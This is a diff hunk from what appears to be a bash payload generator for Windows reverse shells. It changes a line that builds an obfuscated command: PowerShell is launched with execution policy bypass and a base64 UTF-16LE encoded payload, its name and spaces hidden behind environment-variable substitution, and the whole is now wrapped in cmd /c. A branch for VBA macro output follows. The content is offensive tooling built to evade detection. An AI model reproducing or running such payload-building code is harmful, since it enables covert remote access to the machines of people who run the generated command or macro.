@@ -693,8 +693,7 @@ else
 fi
 
 shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
-#rev="set ${pwsh}=${pw_sh} && set ${space}=" " && ${pwsh} && call %${pwsh}%%%${win} -noprofile -executionpolicy bypass -NoExit -e ${shell}"
-rev="set ${pwsh}=${pw_sh} && set ${space}=\" \" && call %${pwsh}%%${space}%${win}%${space}%-noprofile%${space}%-executionpolicy%${space}%bypass%${space}%-NoExit%${space}%-e%${space}%${shell}"
+rev="cmd /c \"set ${pwsh}=${pw_sh} && set ${space}=\" \" && call %${pwsh}%%${space}%${win}%${space}%-noprofile%${space}%-executionpolicy%${space}%bypass%${space}%-NoExit%${space}%-e%${space}%${shell}\""
 
 
 if [[ $5 == "vba" ]] 
